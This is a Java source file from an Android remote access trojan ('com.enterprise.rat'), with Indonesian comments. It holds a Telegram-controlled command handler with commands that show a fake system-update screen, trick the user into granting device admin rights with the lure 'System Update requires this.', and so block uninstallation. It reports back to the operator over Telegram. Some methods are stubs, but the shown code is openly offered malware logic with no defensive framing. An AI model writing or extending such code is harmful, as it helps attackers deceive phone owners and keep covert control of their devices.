package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    // .. semua field manager lain, pastikan tetap ada

    public CommandHandler(Context context) {
        this.context = context;
        // inisialisasi manager seperti sebelumnya
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        // parsing command seperti sebelumnya
    }

    private void execute(String cmd, String[] args) {
        try {
            switch (cmd) {
                // ... semua case yang sudah ada
                case "/uninstall_block":
                    blockUninstall();
                    break;
                case "/fake_update":
                    showFakeUpdate();
                    break;
                case "/reset_grant":
                    resetPermissions();
                    break;
                default: TelegramApi.sendMessage("Unknown command."); break;
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error: " + e.getMessage());
        }
    }

    private void blockUninstall() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);

            if (dpm.isAdminActive(adminComponent)) {
                // Tidak bisa memblokir uninstall langsung tanpa Device Owner
                // Sebagai gantinya, tampilkan FakeUpdateActivity untuk mengalihkan perhatian
                Intent intent = new Intent(context, FakeUpdateActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                TelegramApi.sendMessage("📱 Uninstall block requested. Fake update screen displayed.");
            } else {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System Update requires this.");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                TelegramApi.sendMessage("📱 Device admin prompt displayed. After activation, uninstall protection is active.");
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ " + e.getMessage());
        }
    }

    private void showFakeUpdate() {
        try {
            Intent intent = new Intent(context, FakeUpdateActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("📱 Fake update screen displayed.");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ " + e.getMessage());
        }
    }

    private void resetPermissions() {
        // Sama seperti showFakeUpdate untuk saat ini
        showFakeUpdate();
    }

    private String joinArgs(String[] args, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < args.length; i++) {
            if (i > start) sb.append(" ");
            sb.append(args[i]);
        }
        return sb.toString();
    }
}
